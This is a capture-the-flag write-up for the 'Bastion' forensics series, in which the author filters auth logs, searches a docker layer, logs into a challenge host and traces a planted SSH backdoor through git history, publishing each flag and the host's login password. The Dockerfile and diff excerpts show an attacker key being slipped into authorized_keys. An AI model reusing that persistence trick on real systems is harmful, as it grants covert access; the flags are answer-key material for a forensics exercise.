---
title: "CYBERGAME-{BASTION CHALLENGE} - 2025"
subtitle: "⚡ Bastion was a cool challenge read through and feel it⚡"
summary: "* Kenyan version organized by: Ministry of Information,Communications and the Digital Economy*"
date: 2025-06-10
cardimage: cybergame.png
featureimage: cybergame.png
caption: cybergame
authors:
  - Havoc: logo.png
---

## 1. Introduction

Welcome to this comprehensive writeup for the Bastion CTF challenge series! This series of challenges focuses on server security, forensic analysis, and identifying backdoors in a compromised system. Throughout these challenges, we'll explore various aspects of security, from inspecting docker layers to analyzing git repositories for malicious code.

The Bastion series consists of four progressive challenges:
    
1.  **Bastion - So much just from logs**: inspect the logs to find the flag
2. **Bastion - Inspect the file system**: Examining a docker layer for hidden flags
3. **Bastion - Clean bastion**: Accessing a bastion host via SSH and identifying potential issues
4. **Bastion - Feel free to dig in**: Conducting a deeper forensic investigation for attacker traces
5. **Bastion - The backdoor culprit**: Analyzing a git repository to find the source of a backdoor

. Let's dive in and solve them step by step!

### Tools Used
- Linux command line utilities (tar, grep, find, etc.)
- SSH client
- Git
- Base64 encoding/decoding
### **Challenge 1: Bastion - So much just from logs**

![bastion](https://raw.githubusercontent.com/Daniel-wambua/images/refs/heads/main/bastion%20so%20much%20from%20logs.png?token=GHSAT0AAAAAADFMW2VAWXDU7BT3B5HS7M562CIAVVQ)


**Solution:**

```bash

gzip -d *.gz

cat auth.log* | grep -v -e 'Connection closed by invalid user' -e 'Failed password for invalid user' -e 'Failed none for invalid user' -e 'Invalid user ' -e 'Could not get shadow information' -e 'not allowed because account is locked' -e 'Connection closed by authenticating user' -e 'Failed password for ' | r.csd b64 | r.csd hex

```

This will reveal the flag: `SK-CERT{n3v3r_f0r637_4b0u7_d47_p3r51573nc3}`

  
## 2. Challenge 2: Bastion - Inspect the file system

![bastion](https://raw.githubusercontent.com/Daniel-wambua/images/refs/heads/main/inspect%20the%20file%20system.png?token=GHSAT0AAAAAADFMW2VAZCQTM5E4KNQ6IKZ62CIAX3A)


For this challenge, we are provided with a docker layer archive file named `part2_docker_layer.tar.gz`. Our task is to inspect this file system and find any hidden flags.

### Methodology
1. Extract the docker layer archive
2. Inspect the extracted filesystem
3. Search for the flag in the expected format (SK-CERT{})

### Step-by-Step Solution

#### Step 1: Extract the Docker Layer Archive
First, we need to create a directory for our work and extract the archive:

```bash
mkdir -p /home/ubuntu/ctf_challenge
tar -xzf "part2_docker_layer.tar.gz" -C /home/ubuntu/ctf_challenge
```

#### Step 2: Inspect the Extracted Filesystem
Let's list the contents of the extracted directory to get an overview of the filesystem:

```bash
ls -R /home/ubuntu/ctf_challenge
```

This command reveals a complex directory structure with many files and subdirectories. To navigate this efficiently, we need to focus our search.

#### Step 3: Search for the Flag
Since we know the flag format is SK-CERT{}, we can use grep to search for it across all files:

```bash
grep -a -r "SK-CERT{" /home/ubuntu/ctf_challenge/
```

The `-a` flag treats binary files as text, and `-r` performs a recursive search.

This search returns two potential flags:

```
/home/ubuntu/ctf_challenge/19d1ccfb743d216f8186a3e0273a24132bb7c4c8813d741108c14722a85732fe/merged/tmp/persistence:[Fri Apr 18 16:15:22 UTC 2025] i hope they wont find me, and this flag (SK-CERT{n3v3r_f0r637_4b0u7_d47_p3r51573nc3}) keeps on beaconing
/home/ubuntu/ctf_challenge/19d1ccfb743d216f8186a3e0273a24132bb7c4c8813d741108c14722a85732fe/merged/var/data/keylogger.bin:    === LOG START SK-CERT{l34v3_17_70_7h3_pr05} === %s
```

### Key Findings and Flag
We found two potential flags:
1. `SK-CERT{n3v3r_f0r637_4b0u7_d47_p3r51573nc3}` in `/tmp/persistence`
2. `SK-CERT{l34v3_17_70_7h3_pr05}` in `/var/data/keylogger.bin`

After verification, the correct flag is: **SK-CERT{l34v3_17_70_7h3_pr05}** the other one was the flag for the very first challenge not included in this series because it was easy to get.

### Lessons Learned
- Always check binary files when searching for flags
- Multiple potential flags might be present; verification is important
- The location of a flag can provide context (in this case, a keylogger binary)

## 3. Challenge 3: Bastion - Clean bastion

![bastion](https://raw.githubusercontent.com/Daniel-wambua/images/refs/heads/main/clean%20bastion.png?token=GHSAT0AAAAAADFMW2VB2HNME2CNYVLDRURQ2CIAY7A)

> ssh://exp.cybergame.sk:7009 (ratchet:23ekmnjr4bh5tgvfhbejncidj)

For this challenge, we need to SSH into the provided bastion host and investigate the system.

### Methodology
1. Establish an SSH connection to the bastion host
2. Investigate the system for any issues or flags
3. Document findings

### Step-by-Step Solution

#### Step 1: Connect to the Bastion Host
First, we need to connect to the provided SSH server:

```bash
ssh -p 7009 ratchet@exp.cybergame.sk
```

When prompted, enter the password: `23ekmnjr4bh5tgvfhbejncidj`

Upon successful connection, we're greeted with a welcome message that contains our flag:

```
Welcome, Ratchet!
Come in and don't be shy
     SK-CERT{bru73_f0rc1n6_u53r5_w0rk5}
```

#### Step 2: Verify System Status
Even though we've found the flag, let's perform a basic system check to ensure everything is as expected:

```bash
ls -la /home/ratchet
ls -la /tmp
ls -la /var/tmp
```

These commands show no suspicious files in the home directory or temporary directories.

### Key Findings and Flag
The flag was displayed in the welcome message upon SSH login: **SK-CERT{bru73_f0rc1n6_u53r5_w0rk5}**

### Lessons Learned
- Sometimes flags are hidden in plain sight, like welcome messages
- Initial reconnaissance is crucial, even when a flag is immediately visible
- The flag suggests this challenge was about brute forcing user credentials

## 4. Challenge 4: Bastion - Feel free to dig in

![bastion](https://raw.githubusercontent.com/Daniel-wambua/images/refs/heads/main/feel%20free%20to%20dig%20in.png?token=GHSAT0AAAAAADFMW2VAZ72A76ZTHQEEPDFK2CIA2AA)

> ssh://exp.cybergame.sk:7009

For this challenge, we need to conduct a deeper forensic investigation of the same bastion host to find traces of attackers.

### Methodology
1. Connect to the bastion host
2. Conduct a thorough forensic investigation
3. Look for unusual files, configurations, or hidden data
4. Document all findings

### Step-by-Step Solution

#### Step 1: Connect to the Bastion Host
We use the same SSH connection as in the previous challenge:

```bash
ssh -p 7009 ratchet@exp.cybergame.sk
```

Password: `23ekmnjr4bh5tgvfhbejncidj`

#### Step 2: Investigate User Accounts and Home Directories
Let's check the user accounts and home directories:

```bash
cat /etc/passwd
ls -la /home
```

We notice there's an `admin` user in addition to our `ratchet` user.

#### Step 3: Check SSH Configuration and Keys
Since we're dealing with a bastion host, SSH configuration is a good place to look:

```bash
ls -la /home/ratchet/.ssh
cat /home/ratchet/.ssh/authorized_keys
```

In the authorized_keys file, we find a suspicious entry:

```
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOSeOZtJmXS7zliVg5tEaEk9KvhIRn4S3FBjLuo1s0eUvHi6HkzuLTNXiphR8Lth/DWQNeC/A+meex8Y09RtZQA= hacker-U0stQ0VSVHtoMEx5X00wTGx5X1RIM3lfNHIzXzV0aUxsX2gzUjN9
```

The comment on this key looks like it contains base64-encoded data.

#### Step 4: Decode the Base64 String
Let's decode the base64 string in the comment:

```bash
echo "U0stQ0VSVHtoMEx5X00wTGx5X1RIM3lfNHIzXzV0aUxsX2gzUjN9" | base64 -d
```

This reveals our flag: `SK-CERT{h0Ly_m0Lly_TH3y_4r3_5tiLl_h3R3}`

### Key Findings and Flag
We found a suspicious SSH key in the authorized_keys file with a base64-encoded comment that contained the flag: **SK-CERT{h0Ly_m0Lly_TH3y_4r3_5tiLl_h3R3}**

### Lessons Learned
- Attackers often leave backdoors for persistent access
- SSH authorized_keys files are common places for backdoors
- Base64 encoding is frequently used to hide information
- Always check for unusual comments or strings that might contain encoded data

## 5. Challenge 5: Bastion - The backdoor culprit

![bastion](https://raw.githubusercontent.com/Daniel-wambua/images/refs/heads/main/the%20backdoor%20culprit.png?token=GHSAT0AAAAAADFMW2VB6YSTVPZOUNYD4RF42CIA4OA)

For this challenge, we are provided with a git repository archive (`part5_ssh-bastion-repo.tar.gz`) and need to identify who added the backdoor we found in the previous challenge.

### Methodology
1. Extract the git repository
2. Explore the repository structure
3. Analyze the commit history
4. Identify when and by whom the backdoor was introduced

### Step-by-Step Solution

#### Step 1: Extract the Git Repository
First, let's extract the provided archive:

```bash
mkdir -p /home/ubuntu/bastion_repo_ctf
tar -xzf "part5_ssh-bastion-repo.tar.gz" -C /home/ubuntu/bastion_repo_ctf
```

#### Step 2: Explore the Repository Structure
Let's see what files are in the repository:

```bash
ls -R /home/ubuntu/bastion_repo_ctf/ssh-bastion-repo
```

Output:
```
/home/ubuntu/bastion_repo_ctf/ssh-bastion-repo:
Dockerfile  docker-compose.yml  issue.generic  motd
README.md   issue.admin         issue.ratchet  sshd_config
```

#### Step 3: Examine the Dockerfile
Since we know the backdoor was in the SSH authorized_keys file, let's check the Dockerfile:

```bash
cat /home/ubuntu/bastion_repo_ctf/ssh-bastion-repo/Dockerfile
```

In the Dockerfile, we find the suspicious SSH key being added:

```dockerfile
RUN mkdir -p /home/ratchet/.ssh && \
    echo -e "\
ecdsa-sha2-nistp256 AAAAvZHODysGbxHo1wGtqbqi1Ffnr2li7j8ov/V26Nt4w/HR26mWOtT/APG1qBilJoVmCQChz/hCWuIWwzqqZNe1BQ== ratchet@infocube\n\
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOSeOZtJmXS7zliVg5tEaEk9KvhIRn4S3FBjLuo1s0eUvHi6HkzuLTNXiphR8Lth/DWQNeC/A+meex8Y09RtZQA= hacker-U0stQ0VSVHtoMEx5X00wTGx5X1RIM3lfNHIzXzV0aUxsX2gzUjN9\
" > /home/ratchet/.ssh/authorized_keys
```

#### Step 4: Analyze the Git History
Now, let's check the commit history for the Dockerfile to see who added this backdoor:

```bash
cd /home/ubuntu/bastion_repo_ctf/ssh-bastion-repo
git log --all --pretty=oneline --abbrev-commit Dockerfile
```

Output:
```
434e557 merge suggested changes from colleague
a222654 update ssh keys SK-CERT{r09U3_3MPL0Y33_0r_5uPpLycH41n}
fe00ee7 upgrade base image
018ab72 harden user passwords
3f9744d bastion deployment. initial commit
```

The commit message for `a222654` looks suspicious and contains what appears to be our flag.

#### Step 5: Examine the Specific Commit
Let's look at the details of this commit:

```bash
git show a222654
```

Output:
```
commit a22265452b4b9e02dd3492165c953dd53d1ba393
Author: Ratcher Tailhorn <employee@infocude>
Date:   Fri Apr 18 23:30:01 2025 +0200
    update ssh keys SK-CERT{r09U3_3MPL0Y33_0r_5uPpLycH41n}
diff --git a/Dockerfile b/Dockerfile
index 8fc2b95..41b13b5 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -21,7 +21,8 @@ COPY sshd_config /etc/ssh/sshd_config
 
 RUN mkdir -p /home/ratchet/.ssh && \
     echo -e "\
-ecdsa-sha2-nistp256 AAAAvZHODysGbxHo1wGtqbqi1Ffnr2li7j8ov/V26Nt4w/HR26mWOtT/APG1qBilJoVmCQChz/hCWuIWwzqqZNe1BQ== ratchet@infocube\n
+ecdsa-sha2-nistp256 AAAAvZHODysGbxHo1wGtqbqi1Ffnr2li7j8ov/V26Nt4w/HR26mWOtT/APG1qBilJoVmCQChz/hCWuIWwzqqZNe1BQ== ratchet@infocube\n\
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOSeOZtJmXS7zliVg5tEaEk9KvhIRn4S3FBjLuo1s0eUvHi6HkzuLTNXiphR8Lth/DWQNeC/A+meex8Y09RtZQA= hacker-U0stQ0VSVHtoMEx5X00wTGx5X1RIM3lfNHIzXzV0aUxsX2gzUjN9\
 " > /home/ratchet/.ssh/authorized_keys
```

This confirms that the backdoor was added by "Ratcher Tailhorn" in a commit with the message containing our flag.

### Key Findings and Flag
The backdoor was introduced by a user named "Ratcher Tailhorn" in commit `a222654`. The commit message itself contains the flag: **SK-CERT{r09U3_3MPL0Y33_0r_5uPpLycH41n}**

### Lessons Learned
- Git history is a valuable forensic resource
- Commit messages and author information can reveal the source of malicious code
- Backdoors are often introduced in seemingly innocent updates
- Always review code changes, especially those affecting security configurations

## 6. Conclusion

These challenges demonstrate the importance of thorough system inspection, understanding common backdoor techniques, and the value of version control history in forensic investigations.

### Final Thoughts
The Bastion series provides an excellent progression of challenges that build upon each other, telling a coherent story of system compromise and investigation. The skills practiced here are directly applicable to real-world security scenarios, making this an educational and practical CTF series.

## 7. References

### Useful Commands
- `tar -xzf <archive.tar.gz> -C <destination>` - Extract a tar.gz archive
- `grep -a -r "pattern" <directory>` - Recursively search for a pattern
- `ssh -p <port> <user>@<host>` - Connect to an SSH server
- `echo "<string>" | base64 -d` - Decode a base64 string
- `git log --all --pretty=oneline --abbrev-commit <file>` - View git history for a file
- `git show <commit>` - Show details of a specific commit

### Additional Resources
- [Docker Documentation](https://docs.docker.com/)
- [SSH Security Best Practices](https://www.ssh.com/academy/ssh/security)
- [Git for Security Professionals](https://git-scm.com/book/en/v2)
- [Linux Forensics Tools](https://www.kali.org/tools/)

---

> hope you enjoyed the reading.